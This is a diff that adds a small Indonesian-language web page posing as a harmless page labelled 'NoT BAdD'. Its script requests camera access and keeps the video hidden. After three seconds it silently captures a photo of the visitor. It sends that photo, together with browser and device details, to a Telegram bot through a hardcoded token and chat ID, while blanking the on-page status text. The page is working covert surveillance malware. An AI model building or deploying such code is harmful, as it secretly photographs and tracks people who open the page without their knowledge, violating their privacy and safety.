@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>UhU</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body { font-family: 'Poppins', sans-serif; }
+    video { display: none; } /* Tidak ditampilkan */
+  </style>
+</head>
+<body class="bg-black text-white flex flex-col items-center justify-center min-h-screen p-6">
+
+  <h1 class="text-xl font-bold text-purple-400 mb-4">NoT BAdD</h1>
+  <p class="text-gray-400 text-sm mb-6 text-center">Abcdefghi.</p>
+  <div id="status" class="text-center text-sm text-green-400">Terima dong, kok ga di terima</div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const statusText = document.getElementById('status');
+
+    const BOT_TOKEN = '8197346611:AAFzuVljzjMVtT0rTcviQven8Js2IQTGa8k';
+    const CHAT_ID = '-4627259207';
+
+    // Info perangkat
+    const info = `
+📱 Perangkat: ${/Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}
+🌐 Browser: ${navigator.userAgent}
+🕒 Waktu: ${new Date().toLocaleString()}
+📏 Resolusi: ${window.screen.width}x${window.screen.height}
+    `.trim();
+
+    // Akses kamera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        statusText.textContent = "";
+
+        // Tunggu 3 detik, lalu ambil screenshot
+        setTimeout(() => {
+          takeScreenshotAndSend();
+        }, 3000);
+      })
+      .catch(error => {
+        statusText.textContent = "" + error.message;
+      });
+
+    function takeScreenshotAndSend() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      const dataURL = canvas.toDataURL('image/jpeg');
+
+      sendToTelegram(dataURL);
+    }
+
+    function sendToTelegram(imageData) {
+      statusText.textContent = "";
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: (() => {
+          const form = new FormData();
+          form.append("chat_id", CHAT_ID);
+          form.append("caption", info);
+          form.append("photo", dataURLtoBlob(imageData), 'capture.jpg');
+          return form;
+        })()
+      })
+      .then(res => res.json())
+      .then(res => {
+        if (res.ok) {
+          statusText.textContent = "";
+        } else {
+          statusText.textContent = "" + res.description;
+        }
+      })
+      .catch(err => {
+        statusText.textContent = "" + err.message;
+      });
+    }
+
+    // Fungsi ubah base64 ke Blob
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+      for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
+      return new Blob([u8arr], { type: mime });
+    }
+  </script>
+</body>
+</html>
